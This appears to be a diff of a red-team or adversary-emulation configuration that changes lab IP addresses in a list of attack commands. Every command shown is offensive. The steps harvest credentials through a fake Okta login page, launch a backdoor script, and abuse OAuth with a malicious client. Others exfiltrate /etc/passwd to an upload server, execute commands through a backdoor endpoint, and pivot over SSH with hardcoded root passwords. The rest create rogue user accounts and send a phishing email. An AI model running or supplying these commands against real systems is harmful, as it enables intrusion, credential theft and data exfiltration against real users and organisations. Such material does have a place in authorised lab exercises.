@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/ > okta_fake_login.html && echo \"Send the link http://172.21.0.20/ to target users for credential harvesting\""
+        "command": "curl http://192.168.20.30/ > okta_fake_login.html && echo \"Send the link http://192.168.20.30/ to target users for credential harvesting\""
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'if ! ss -tuln | grep -q \":5055 \"; then su attacker -c \"python3 /home/attacker/malware/backdoor.py &\"; else echo \"Port 5055 already in use\"; fi'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'if ! ss -tuln | grep -q \":5055 \"; then su attacker -c \"python3 /home/attacker/malware/backdoor.py &\"; else echo \"Port 5055 already in use\"; fi'"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/crm.php"
+        "command": "curl http://192.168.20.30/crm.php"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://172.21.0.20:8444/oauth/authorize && TOKEN=$(curl -s -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://172.21.0.20:8444/oauth/authorize | sed -n 's/.*\"access_token\" *: *\"\\([^\"]*\\)\".*/\\1/p') && curl -H \"Authorization: Bearer $TOKEN\" http://172.21.0.20:8444/data"
+        "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://192.168.20.30:8444/oauth/authorize && TOKEN=$(curl -s -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://192.168.20.30:8444/oauth/authorize | sed -n 's/.*\"access_token\" *: *\"\\([^\"]*\\)\".*/\\1/p') && curl -H \"Authorization: Bearer $TOKEN\" http://192.168.20.30:8444/data"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "smbclient -L //172.21.0.20 -U DebianUser%DebianUser && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'dir'"
+        "command": "smbclient -L //192.168.20.30 -U DebianUser%DebianUser && smbclient //192.168.20.30/share -U DebianUser%DebianUser -c 'dir'"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -F \"file=@/etc/passwd\" http://172.21.0.20:8116/upload"
+        "command": "curl -F \"file=@/etc/passwd\" http://192.168.20.30:8116/upload"
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@172.22.0.20 \"cat /etc/passwd\"'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@192.168.30.40 \"cat /etc/passwd\"'"
       }
     ]
   },
@@ -130,7 +130,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"Test email from attacker\" | mail -s \"Test Subject\" shinycorp@172.22.0.20'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"Test email from attacker\" | mail -s \"Test Subject\" shinycorp@192.168.30.40'"
       }
     ]
   },
@@ -145,7 +145,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh root@172.21.0.20 'ls -la / && find / -maxdepth 2 -type d'"
+        "command": "sshpass -p 'RootPass123' ssh root@192.168.20.30 'ls -la / && find / -maxdepth 2 -type d'"
       }
     ]
   },
@@ -160,7 +160,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+        "command": "curl --proxy http://192.168.20.30:8888 http://192.168.30.40"
       }
     ]
   },
@@ -175,7 +175,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 \"id -u fakepersona &>/dev/null || useradd -m fakepersona; echo 'fakepersona:FakePass123' | chpasswd\" \nsshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersona@172.21.0.20 'hostname; whoami; echo \"=====\"; echo \"$(whoami) on $(uname -n) registering something using fakepersona.\"'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 \"id -u fakepersona &>/dev/null || useradd -m fakepersona; echo 'fakepersona:FakePass123' | chpasswd\" \nsshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersona@192.168.20.30 'hostname; whoami; echo \"=====\"; echo \"$(whoami) on $(uname -n) registering something using fakepersona.\"'"
       }
     ]
   },
@@ -190,7 +190,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -F \"file=@/usr/lib/python3.13/io.py\" http://172.21.0.20:8116/upload"
+        "command": "curl -F \"file=@/usr/lib/python3.13/io.py\" http://192.168.20.30:8116/upload"
       }
     ]
   },
@@ -205,7 +205,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -F \"file=@/etc/passwd\" http://172.21.0.20:8116/upload"
+        "command": "curl -F \"file=@/etc/passwd\" http://192.168.20.30:8116/upload"
       }
     ]
   },
@@ -220,7 +220,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -F \"file=@/etc/passwd\" http://172.21.0.20:8116/upload"
+        "command": "curl -F \"file=@/etc/passwd\" http://192.168.20.30:8116/upload"
       }
     ]
   },
@@ -235,7 +235,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 \"id -u fakepersonax &>/dev/null || useradd -m fakepersonax; echo 'fakepersonax:FakePass123' | chpasswd\" \nsshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersonax@172.21.0.20 'hostname; whoami; echo \"=====\"; echo \"$(whoami) on $(uname -n) registering something using fakepersona.\"'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 \"id -u fakepersonax &>/dev/null || useradd -m fakepersonax; echo 'fakepersonax:FakePass123' | chpasswd\" \nsshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersonax@192.168.20.30 'hostname; whoami; echo \"=====\"; echo \"$(whoami) on $(uname -n) registering something using fakepersona.\"'"
       }
     ]
   },
@@ -265,7 +265,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"Click here and give me your password\" | mail -s \"Password Expired\" victim@172.22.0.20'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"Click here and give me your password\" | mail -s \"Password Expired\" victim@192.168.30.40'"
       }
     ]
   },
